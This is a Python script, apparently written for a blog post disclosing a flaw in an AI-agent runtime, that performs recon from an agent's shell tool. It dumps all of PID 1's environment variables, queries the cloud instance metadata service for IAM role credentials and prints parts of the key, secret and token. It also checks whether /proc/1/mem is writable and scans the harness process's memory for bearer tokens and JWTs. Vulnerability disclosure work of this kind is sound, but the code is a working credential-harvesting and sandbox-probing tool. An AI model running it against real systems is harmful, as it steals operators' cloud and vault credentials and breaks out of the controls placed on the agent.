"""Blog demo — detailed runtime recon for the identity vault blog post.

Shows:
  1. Process identity (id, whoami, pid, capabilities)
  2. Full filesystem root (ls -la /)
  3. /etc probe (resolv.conf, hostname, os-release)
  4. /opt/amazon layout + Identity SDK + loopy + strands
  5. /proc/1/environ — ALL env vars
  6. /proc/1/mem access check (the primitive)
  7. Heap anchor scan — what credential-shaped artifacts live in PID 1's memory

No env vars needed. No exfil. Pure recon for blog screenshots.
Designed to produce complete, structured output — no truncation.

Output is printed as sections delimited by:
  ============================================================
    TITLE
  ============================================================

Hosted at github.com/nivmorabin/skills/dict-walk/pid1_blog_recon.py
"""
import os
import re
import subprocess
import sys


def run(cmd, timeout=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout, text=True)
        return (r.stdout.strip() or '') + (('\n[stderr] ' + r.stderr.strip()) if r.stderr.strip() else '')
    except subprocess.TimeoutExpired:
        return '(timeout)'
    except Exception as e:
        return f'(error: {e})'


def section(title):
    print(f'\n{"=" * 60}')
    print(f'  {title}')
    print(f'{"=" * 60}')


def main():
    # --- 1. Process identity ---
    section('1. PROCESS IDENTITY')
    print('$ id')
    print(run('id'))
    print()
    print('$ whoami')
    print(run('whoami'))
    print()
    print(f'PID:  {os.getpid()}')
    print(f'PPID: {os.getppid()}')
    print(f'UID:  {os.getuid()}')
    print(f'CWD:  {os.getcwd()}')

    # --- 2. Filesystem root ---
    section('2. FILESYSTEM ROOT')
    print('$ ls -la /')
    print(run('ls -la /'))

    # --- 3. /etc probe ---
    section('3. /etc PROBE')
    print('$ cat /etc/os-release')
    print(run('cat /etc/os-release 2>/dev/null | head -5'))
    print()
    print('$ cat /etc/hostname')
    print(run('cat /etc/hostname 2>/dev/null || echo "(not set)"'))
    print()
    print('$ grep nameserver /etc/resolv.conf')
    print(run('grep nameserver /etc/resolv.conf 2>/dev/null'))

    # --- 4. Harness runtime layout ---
    section('4. HARNESS RUNTIME (/opt/amazon)')
    print('$ ls -la /opt/amazon/')
    print(run('ls -la /opt/amazon/'))
    print()
    print('--- Interesting site-packages ---')
    pkg_dir = '/opt/amazon/lib/python3.10/site-packages'
    identity_paths = []
    if os.path.isdir(pkg_dir):
        for root, dirs, files in os.walk(pkg_dir):
            for f in files:
                full = os.path.join(root, f)
                rel = full[len(pkg_dir)+1:]
                if ('bedrock_agentcore/identity' in rel or
                    'bedrock_agentcore/services/identity' in rel or
                    rel.startswith('loopy/')):
                    identity_paths.append(rel)
        for p in sorted(set(identity_paths)):
            print(f'  {p}')
    print()
    print('--- Strands agents ---')
    strands_dir = os.path.join(pkg_dir, 'strands')
    if os.path.isdir(strands_dir):
        for item in sorted(os.listdir(strands_dir)):
            full = os.path.join(strands_dir, item)
            if os.path.isdir(full):
                print(f'  {item}/ ({len(os.listdir(full))} files)')
            else:
                print(f'  {item}')

    # --- 5. PID 1 identity ---
    section('5. PID 1 (the harness process)')
    print('$ cat /proc/1/cmdline')
    try:
        cmdline = open('/proc/1/cmdline', 'rb').read().replace(b'\x00', b' ').decode('utf-8', errors='replace').strip()
        print(f'  {cmdline}')
    except Exception as e:
        print(f'  (error: {e})')
    print()
    print('$ cat /proc/1/status | grep ...')
    try:
        status = open('/proc/1/status').read()
        for line in status.splitlines():
            if line.startswith(('Name:', 'Uid:', 'Gid:', 'Seccomp:', 'NoNewPrivs:', 'TracerPid:', 'CapBnd:')):
                print(f'  {line}')
    except Exception as e:
        print(f'  (error: {e})')

    # --- 6. /proc/1/environ ---
    section('6. /proc/1/environ (ALL environment variables)')
    print("$ open('/proc/1/environ', 'rb').read().split(b'\\\\x00')")
    print()
    try:
        raw_env = open('/proc/1/environ', 'rb').read()
        entries = raw_env.split(b'\x00')
        all_vars = {}
        for entry in entries:
            if b'=' in entry:
                k, v = entry.split(b'=', 1)
                all_vars[k.decode('utf-8', errors='replace')] = v.decode('utf-8', errors='replace')
        for k in sorted(all_vars):
            v = all_vars[k]
            if len(v) > 120:
                v = v[:120] + '...'
            print(f'  {k}={v}')
        print(f'\n  ({len(all_vars)} total environment variables)')
    except Exception as e:
        print(f'  ERROR: {e}')

    # --- 7. IMDS probe ---
    section('7. IMDS (Instance Metadata Service)')
    print('$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/')
    print()
    role_name = run('curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/')
    print(f'  Role: {role_name}')
    if role_name and role_name != '(timeout)' and 'error' not in role_name.lower():
        print()
        print(f'$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}')
        creds_raw = run(f'curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}')
        # Parse and show structure without exposing full secret key
        try:
            import json as _json
            creds = _json.loads(creds_raw)
            print(f'  Type:            {creds.get("Type", "?")}')
            print(f'  AccessKeyId:     {creds.get("AccessKeyId", "?")[:20]}...')
            print(f'  SecretAccessKey:  {creds.get("SecretAccessKey", "?")[:8]}... (redacted)')
            print(f'  Token:           {str(creds.get("Token", "?"))[:20]}... (len={len(str(creds.get("Token", "")))})')
            print(f'  Expiration:      {creds.get("Expiration", "?")}')
            print(f'  LastUpdated:     {creds.get("LastUpdated", "?")}')
        except Exception:
            # Show first 200 chars if not JSON
            print(f'  {creds_raw[:200]}')
        print()
        print('  IMDS is reachable. The exec role credentials are obtainable')
        print('  from the shell tool — same path notebook 13 uses for direct')
        print('  vault access via boto3.')
    else:
        print('  IMDS not reachable or no role attached.')

    # --- 8. /proc/1/mem access ---
    section('8. /proc/1/mem ACCESS CHECK (the primitive)')
    print("$ python3 -c \"import os; print(os.access('/proc/1/mem', os.R_OK | os.W_OK))\"")
    print()
    mem_r = os.access('/proc/1/mem', os.R_OK)
    mem_w = os.access('/proc/1/mem', os.W_OK)
    print(f'  /proc/1/mem readable: {mem_r}')
    print(f'  /proc/1/mem writable: {mem_w}')
    print()
    try:
        yama = open('/proc/sys/kernel/yama/ptrace_scope').read().strip()
        print(f'  Yama ptrace_scope: {yama}')
    except FileNotFoundError:
        print(f'  Yama ptrace_scope: NOT LOADED (kernel has no Yama module)')
    print()
    if mem_r and mem_w:
        print('  RESULT: The shell tool can read AND write PID 1\'s entire')
        print('  address space. No ptrace needed, no capabilities needed.')
        print('  Just open("/proc/1/mem", "r+b") and seek to any address.')

    # --- 9. Heap anchor scan ---
    section('9. HEAP ANCHOR SCAN — what lives in PID 1\'s memory?')
    print('  We can read /proc/1/mem. What credential-shaped artifacts')
    print('  are sitting in the harness process\'s heap right now?')
    print()

    ANCHORS = [
        (b'HarnessRemoteMcpConfig', 'MCP tool config (Pydantic model)'),
        (b'HarnessToolType', 'Tool type enum'),
        (b'HarnessHeaders', 'HTTP headers config'),
        (b'"method":"initialize"', 'MCP initialize call'),
        (b'"method":"tools/list"', 'MCP tools/list call'),
        (b'"method":"tools/call"', 'MCP tools/call invocation'),
        (b'"protocolVersion":"2024-11-05"', 'MCP protocol version'),
        (b'Authorization: Bearer', 'Authorization header (CREDENTIAL)'),
        (b'authorization: Bearer', 'authorization header (lowercase)'),
        (b'server: uvicorn', 'Uvicorn response header'),
        (b'HTTP/1.1 200 OK', 'HTTP response status'),
        (b'credential-provider/', 'Credential provider ARN'),
        (b'token-vault/', 'Token vault ARN path'),
        (b'resolve_header_references', 'Loopy vault-resolution function'),
        (b'GetWorkloadAccessToken', 'Identity API call name'),
        (b'workloadIdentity', 'Workload identity reference'),
        (b'eyJraWQiOi', 'JWT with kid header (CREDENTIAL)'),
        (b'eyJhbGciOi', 'JWT with alg header (CREDENTIAL)'),
        (b'bedrock-agentcore.us-east-1.amazonaws.com/runtimes/', 'AgentCore runtime URL'),
    ]

    regions = []
    for line in open('/proc/1/maps').readlines():
        parts = line.split()
        if len(parts) < 2:
            continue
        perms = parts[1]
        if 'r' not in perms:
            continue
        try:
            start_s, end_s = parts[0].split('-')
            lo, hi = int(start_s, 16), int(end_s, 16)
            if 4096 <= hi - lo <= 50 * 1024 * 1024:
                regions.append((lo, hi))
        except Exception:
            continue

    found_anchors = {}
    with open('/proc/1/mem', 'rb') as mem:
        for lo, hi in regions:
            try:
                mem.seek(lo)
                chunk = mem.read(hi - lo)
            except (OSError, OverflowError):
                continue
            for needle, label in ANCHORS:
                count = chunk.count(needle)
                if count > 0:
                    found_anchors[label] = found_anchors.get(label, 0) + count

    print(f'  {"ARTIFACT":<45s} {"HITS":>5s}')
    print(f'  {"-"*45} {"-----":>5s}')
    for needle, label in ANCHORS:
        count = found_anchors.get(label, 0)
        if count > 0:
            marker = '  <<<' if 'CREDENTIAL' in label else ''
            print(f'  {label:<45s} {count:>5d}{marker}')

    cred_hits = sum(
        found_anchors.get(label, 0)
        for _, label in ANCHORS
        if 'CREDENTIAL' in label
    )
    print()
    if cred_hits > 0:
        print(f'  >>> {cred_hits} credential-shaped artifacts found in PID 1 heap.')
        print('  >>> The vault-resolved Bearer token is sitting in memory,')
        print('  >>> readable by any code the shell tool executes.')
    else:
        print('  (No credential artifacts yet — run Cell 2 first to trigger')
        print('   a legitimate MCP call that resolves the vault credential.)')

    section('DONE')


if __name__ == '__main__':
    main()
